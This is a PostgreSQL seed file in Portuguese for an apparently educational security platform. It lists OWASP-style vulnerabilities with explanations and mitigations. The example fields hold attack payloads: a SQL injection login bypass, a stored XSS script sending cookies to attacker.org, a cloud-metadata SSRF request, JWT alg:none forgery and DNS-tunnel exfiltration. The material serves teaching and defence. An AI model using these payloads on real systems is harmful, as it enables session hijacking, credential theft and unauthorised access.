-- ====================================================================
-- Security X - Dados Iniciais (Seeds) para PostgreSQL
-- Categorias e Terminologias de Fragilidades em Sistemas de Informação
-- ====================================================================

-- Inserção de Categorias Temáticas
INSERT INTO categories (id, name, description, badge_label, sort_order) VALUES
('owasp-top10', 'OWASP Top 10 Web', 'Principais riscos de segurança em aplicações web modernos conforme a Open Web Application Security Project.', 'Web Application', 1),
('network-infra', 'Redes & Infraestrutura', 'Vulnerabilidades em protocolos de rede, servidores, firewalls e camadas de transporte.', 'Infraestrutura', 2),
('auth-access', 'Autenticação & Controle de Acesso', 'Falhas em verificação de identidade, tokens de sessão, permissões e privilégios de usuário.', 'Identidade & Acesso', 3),
('data-crypto', 'Criptografia & Vazamento de Dados', 'Uso inadequado de algoritmos de cifragem, chaves estáticas e armazenamento desprotegido de dados sensíveis.', 'Criptografia', 4),
('api-services', 'Segurança de APIs & Microsserviços', 'Vulnerabilidades emergentes em endpoints REST, GraphQL, desserialização e chamadas remotas.', 'APIs & Cloud', 5)
ON CONFLICT (id) DO NOTHING;

-- Inserção de Vulnerabilidades Exemplares
INSERT INTO vulnerabilities (
    id, title, category_id, severity, short_summary, detailed_description,
    practical_example, mitigation, cwe_id, owasp_reference, attack_vector, impact_scope
) VALUES
(
    'vuln-sqli',
    'SQL Injection (Injeção de SQL)',
    'owasp-top10',
    'Critical',
    'Inserção de comandos SQL maliciosos através de entradas de formulários não sanitizadas para manipular o banco de dados.',
    'Ocorre quando dados fornecidos pelo usuário são concatenados diretamente em comandos SQL sem validação ou parametrização. O interpretador de banco de dados não consegue distinguir entre o comando legítimo e o código inserido pelo atacante, permitindo leitura não autorizada de dados, alteração de tabelas e até execução de comandos no sistema operacional hospedeiro.',
    'Exemplo clássico em formulário de login:\nCampo de usuário preenchido com: "admin'' OR ''1''=''1".\nA query gerada se torna:\nSELECT * FROM usuarios WHERE username = ''admin'' OR ''1''=''1'' AND password = ''xyz'';\nComo ''1''=''1'' é sempre verdadeiro, a validação é burlada e o atacante obtém acesso à conta sem senha.',
    '1. Utilizar sempre Prepared Statements (consultas parametrizadas) ou ORMs consolidados.\n2. Aplicar o princípio do menor privilégio para o usuário de conexão do banco.\n3. Implementar Web Application Firewall (WAF) como camada complementar.',
    'CWE-89',
    'A03:2021-Injection',
    'HTTP Request / Formulário de Entrada',
    'Confidencialidade, Integridade e Disponibilidade Total do Banco'
),
(
    'vuln-xss-stored',
    'Cross-Site Scripting Persistente (Stored XSS)',
    'owasp-top10',
    'High',
    'Scripts maliciosos em JavaScript são gravados permanentemente no servidor e executados no navegador de outros usuários.',
    'Ocorre quando uma aplicação recebe entrada não confiável (por exemplo, na área de comentários de um fórum ou no perfil de um usuário) e a armazena no banco de dados sem sanitização prévia. Quando qualquer outro estudante ou administrador visita a página afetada, o script é carregado e executado no contexto do navegador da vítima, podendo roubar cookies de sessão (Session Hijacking) ou redirecionar para páginas de phishing.',
    'Em um fórum de alunos, o atacante publica o comentário:\n<script>fetch("https://attacker.org/steal?cookie=" + encodeURIComponent(document.cookie));</script>\nSempre que um colega abre o tópico, seus cookies de sessão são enviados silenciosamente para o servidor do atacante.',
    '1. Escapar e codificar adequadamente todo conteúdo dinâmico antes de renderizá-lo no HTML.\n2. Utilizar a flag HttpOnly em cookies de autenticação para impedir leitura via JS.\n3. Configurar Content Security Policy (CSP) robusta.',
    'CWE-79',
    'A03:2021-Injection',
    'Inputs salvos em banco / Fóruns e Perfis',
    'Sequestro de Sessão e Execução de Ações Não Autorizadas'
),
(
    'vuln-bola',
    'BOLA / IDOR (Broken Object Level Authorization)',
    'api-services',
    'Critical',
    'Falta de validação se o usuário autenticado realmente possui permissão para acessar o identificador de recurso solicitado.',
    'É a vulnerabilidade número 1 do OWASP API Top 10. Acontece quando a API expõe um endpoint que aceita o ID de um objeto (por exemplo, /api/pedidos/1024) e confia que o usuário solicitante só buscará seus próprios dados, deixando de verificar no banco se o registro 1024 pertence de fato ao usuário autenticado.',
    'O aluno João está logado e inspeciona a chamada da rede:\nGET /api/relatorios/estudante/8892\nAo trocar manualmente o ID na URL para 8893, a API retorna o boletim confidencial de outro colega com notas e dados pessoais sem bloquear a requisição.',
    '1. Validar no backend se o usuário ativo (obtido pelo token JWT/sessão) é o proprietário ou possui papel autorizado para o recurso.\n2. Preferir identificadores não sequenciais, como UUIDs v4 criptograficamente seguros.',
    'CWE-639',
    'API1:2023-Broken Object Level Authorization',
    'Parâmetro de URL / Payload de API REST',
    'Exposição Massiva de Dados Pessoais de Outros Usuários'
),
(
    'vuln-ssrf',
    'Server-Side Request Forgery (SSRF)',
    'owasp-top10',
    'Critical',
    'Indução do servidor da aplicação a disparar requisições de rede para serviços internos ou metadados de nuvem.',
    'Ocorre quando uma funcionalidade web solicita uma URL externa (como importar avatar por URL ou webhook) e faz a requisição em nome do servidor sem restringir os destinos permitidos. O atacante pode apontar para endereços de loopback (127.0.0.1) ou metadados de nuvem (169.254.169.254), acessando credenciais mestras de instâncias AWS/GCP.',
    'Uma funcionalidade de download de foto de perfil recebe:\nPOST /api/perfil/avatar-url\nPayload: {"url": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"}\nO servidor backend requisita o endpoint de nuvem e devolve a chave privada do cluster.',
    '1. Implementar listas estritas de protocolos e domínios permitidos (Allowlist).\n2. Bloquear resolução de DNS para faixas privadas (RFC 1918 e metadados de nuvem).\n3. Desativar redirecionamentos HTTP automáticos em clientes de requisição.',
    'CWE-918',
    'A10:2021-Server-Side Request Forgery',
    'Entrada de URL externa processada pelo servidor',
    'Acesso a Redes Internas e Vazamento de Credenciais de Nuvem'
),
(
    'vuln-mitm-arp',
    'ARP Spoofing / Man-in-the-Middle (MitM)',
    'network-infra',
    'High',
    'Envenenamento da tabela ARP de uma rede local para interceptar e alterar o tráfego entre clientes e o roteador.',
    'No protocolo ARP (Address Resolution Protocol), não há autenticação nativa nas mensagens de resposta. Um atacante conectado na mesma rede Wi-Fi ou Ethernet pode enviar pacotes ARP falsos alegando que o endereço IP do gateway padrão possui o seu próprio endereço MAC. Dispositivos da rede começam a enviar todo o tráfego para a máquina do atacante antes que ele chegue à internet.',
    'Em uma rede universitária aberta, o atacante executa ferramentas como arpspoof. Os colegas que navegam na web sem TLS têm suas senhas e conversas lidas em texto claro pelo invasor.',
    '1. Habilitar Dynamic ARP Inspection (DAI) e DHCP Snooping em switches gerenciáveis.\n2. Forçar uso de HTTPS com HSTS em todas as aplicações web.\n3. Utilizar VPN corporativa/acadêmica com túnel cifrado em redes públicas.',
    'CWE-300',
    'A02:2021-Cryptographic Failures',
    'Rede Local (LAN / Wi-Fi)',
    'Interceptação de Credenciais e Modificação de Tráfego'
),
(
    'vuln-syn-flood',
    'SYN Flood (Negação de Serviço TCP)',
    'network-infra',
    'Medium',
    'Sobrecarga da fila de conexões pendentes do servidor enviando múltiplos pacotes SYN sem completar o handshake.',
    'Durante o aperto de mãos de três vias do protocolo TCP (SYN -> SYN-ACK -> ACK), o servidor aloca recursos de memória para cada conexão semiaberta. No ataque de SYN Flood, o invasor dispara milhares de solicitações SYN falsificando IPs de origem ou simplesmente nunca enviando o ACK final. A tabela de conexões se esgota e novos estudantes legítimos recebem erro de conexão recusada.',
    'Envio de centenas de milhares de pacotes SYN por segundo para a porta 443 do portal estudantil, preenchendo o buffer de conexões e impedindo que alunos acessem o sistema de matrícula.',
    '1. Ativar SYN Cookies no kernel do sistema operacional do servidor.\n2. Reduzir o tempo limite de espera por SYN-ACK (timeout).\n3. Utilizar proteção contra DDoS e firewalls stateful com rate limiting.',
    'CWE-400',
    'A04:2021-Insecure Design',
    'Camada de Transporte TCP',
    'Indisponibilidade do Serviço para Todos os Usuários'
),
(
    'vuln-weak-jwt',
    'Assinatura Fraca ou Nula em JWT (None Algorithm)',
    'auth-access',
    'Critical',
    'Aceitação indevida de tokens JWT com cabeçalho contendo "alg": "none" ou assinatura com chave simétrica fraca.',
    'JSON Web Tokens (JWT) dependem de uma assinatura criptográfica para garantir que as reivindicações (claims) não foram alteradas. Bibliotecas mal configuradas podem aceitar o algoritmo "none", permitindo que qualquer usuário altere seu cargo para "admin" e envie o token sem assinatura. Outro erro comum é usar a chave pública RSA em um algoritmo HMAC, fazendo o servidor usar a chave pública conhecida para validar a assinatura.',
    'O atacante decodifica o cabeçalho do token:\n{"alg": "HS256", "typ": "JWT"}\nEle altera para:\n{"alg": "none", "typ": "JWT"}\nNo payload ele muda "role": "estudante" para "role": "admin" e apaga a parte final da assinatura. O backend vulnerável aceita e concede privilégio total.',
    '1. Rejeitar categoricamente tokens com "alg": "none".\n2. Garantir que a biblioteca de validação force o algoritmo esperado de forma explícita.\n3. Usar chaves secretas longas com entropia alta ou pares de chaves assimétricas seguras (Ed25519/RS256).',
    'CWE-347',
    'A07:2021-Identification and Authentication Failures',
    'Cabeçalho de Autorização HTTP (Bearer Token)',
    'Escalação Total de Privilégios para Administrador'
),
(
    'vuln-hardcoded-keys',
    'Chaves Criptográficas Hardcoded no Código Fonte',
    'data-crypto',
    'High',
    'Inclusão de segredos, chaves de API ou senhas de banco de dados diretamente nos arquivos de código ou repositório Git.',
    'Desenvolvedores frequentemente inserem chaves de serviço ou salts de criptografia como constantes no código durante o desenvolvimento inicial. Caso o repositório seja público ou outros membros da equipe tenham acesso, essas chaves são comprometidas. Mesmo removendo em um commit posterior, o histórico do Git preserva o segredo a menos que o histórico seja reescrito.',
    'No arquivo de configuração:\nconst JWT_SECRET = "minha_senha_super_secreta_123";\nQualquer atacante que clonar o repositório pode forjar tokens de autenticação válidos para qualquer usuário do sistema.',
    '1. Armazenar segredos exclusivamente em variáveis de ambiente (.env) ou cofres como AWS Secrets Manager / Vault.\n2. Implementar ferramentas de verificação de pré-commit (como git-secrets ou truffleHog).\n3. Adicionar arquivos .env ao .gitignore imediatamente na criação do projeto.',
    'CWE-798',
    'A02:2021-Cryptographic Failures',
    'Repositórios Git / Código-Fonte',
    'Comprometimento Irreversível de Contas e Bancos de Dados'
),
(
    'vuln-rate-limiting',
    'Ausência de Rate Limiting (Ataque de Força Bruta)',
    'auth-access',
    'High',
    'Permissão irrestrita de tentativas sucessivas de login ou recuperação de senha em curtos intervalos de tempo.',
    'Quando uma rota de autenticação não limita o número de requisições por IP ou por conta em um período de tempo, invasores podem rodar dicionários com milhões de senhas populares (wordlists como RockYou) até encontrar a credencial correta. O mesmo se aplica a códigos de verificação de dois fatores de 6 dígitos que podem ser testados em minutos.',
    'Um bot dispara 500 requisições por segundo para /api/login testando senhas comuns ("123456", "senha2026") para o e-mail de um professor, descobrindo a senha em poucos segundos.',
    '1. Aplicar rate limiting com bibliotecas como express-rate-limit ou regras no gateway (Redis/Cloudflare).\n2. Implementar bloqueio temporário ou CAPTCHA adaptativo após 5 tentativas incorretas.\n3. Exigir autenticação multifator (MFA).',
    'CWE-307',
    'A07:2021-Identification and Authentication Failures',
    'Endpoint de Login e Recuperação de Senha',
    'Quebra de Contas e Roubo de Acesso'
),
(
    'vuln-insecure-deserialization',
    'Desserialização Insegura de Objetos',
    'api-services',
    'Critical',
    'Processamento de dados binários ou serializados enviados pelo cliente sem validação, resultando em Execução Remota de Código (RCE).',
    'A serialização converte estruturas de dados em sequências de bytes para transmissão ou armazenamento. Se a aplicação desserializa objetos controlados pelo usuário em linguagens como Java, Python ou Node.js, um atacante pode injetar sequências maliciosas conhecidas como "gadget chains" que invocam métodos perigosos do sistema durante a reconstituição do objeto.',
    'Envio de um cookie ou payload JSON/YAML modificado contendo instruções mágicas de execução de processo do sistema (ex.: comando rm -rf ou netcat reverso).',
    '1. Evitar formatos de serialização dependentes de linguagem nativa; priorizar formatos agnósticos simples como JSON padrão.\n2. Assinar criptograficamente qualquer dado serializado com HMAC antes da transmissão.\n3. Executar o interpretador em ambiente isolado (sandbox/container com permissões mínimas).',
    'CWE-502',
    'A08:2021-Software and Data Integrity Failures',
    'Cookies de Sessão / Mensagens de Fila / Payloads',
    'Execução Remota de Código (RCE) no Servidor'
),
(
    'vuln-dns-tunneling',
    'DNS Tunneling (Exfiltração de Dados por DNS)',
    'network-infra',
    'Medium',
    'Codificação e envio de dados sigilosos dentro de consultas DNS para contornar restrições de firewall corporativo.',
    'Muitas redes corporativas e acadêmicas bloqueiam saídas HTTP/HTTPS não autorizadas, mas quase sempre permitem consultas DNS (porta 53 UDP) para servidores de nomes. Malwares utilizam isso encapsulando dados em subdomínios (ex: segredo-codificado.atacante.com), permitindo comunicação bidirecional com o centro de comando (C2) sem ser detectado por firewalls comuns.',
    'A máquina infectada envia sucessivas consultas DNS como:\nZGF2aWQgc2VuaGE=.exemplo-c2.net\nO servidor DNS autoritativo do atacante recebe a consulta e decodifica a informação que vazou da rede interna.',
    '1. Inspecionar o volume e comprimento das consultas DNS com sistemas IDS/IPS.\n2. Adotar DNS seguro (DNS over HTTPS / DNSSEC) e resolução através de resolvers internos validados.\n3. Bloquear tráfego direto de clientes na porta 53 para a internet.',
    'CWE-319',
    'A02:2021-Cryptographic Failures',
    'Consultas UDP porta 53 (DNS)',
    'Exfiltração Discreta de Dados e Comando Remoto (C2)'
),
(
    'vuln-clickjacking',
    'Clickjacking (UI Redressing)',
    'owasp-top10',
    'Medium',
    'Sobreposição da aplicação legítima em um iframe invisível para induzir o usuário a clicar em ações indesejadas.',
    'O invasor constrói uma página atrativa (ex: "Clique aqui para ganhar um desconto!") e posiciona por cima, de forma 100% transparente via CSS (opacity: 0), um iframe contendo a página logada da vítima (ex: botão "Excluir Conta" ou "Transferir Recursos"). Ao clicar no suposto jogo, a vítima clica no botão do site transparente.',
    'O usuário logado no portal estudantil acessa uma página maliciosa e clica em um botão colorido, acionando na verdade o botão "Cancelar Matrícula" da faculdade que estava invisível logo abaixo do cursor.',
    '1. Configurar o cabeçalho Content-Security-Policy com a diretiva frame-ancestors ''none'' ou ''self''.\n2. Enviar o cabeçalho X-Frame-Options: DENY ou SAMEORIGIN.\n3. Usar atributos SameSite=Strict ou Lax em cookies de autenticação.',
    'CWE-1021',
    'A05:2021-Security Misconfiguration',
    'Página maliciosa de terceiros com iframe',
    'Execução Involuntária de Ações de Alto Impacto'
)
ON CONFLICT (id) DO NOTHING;
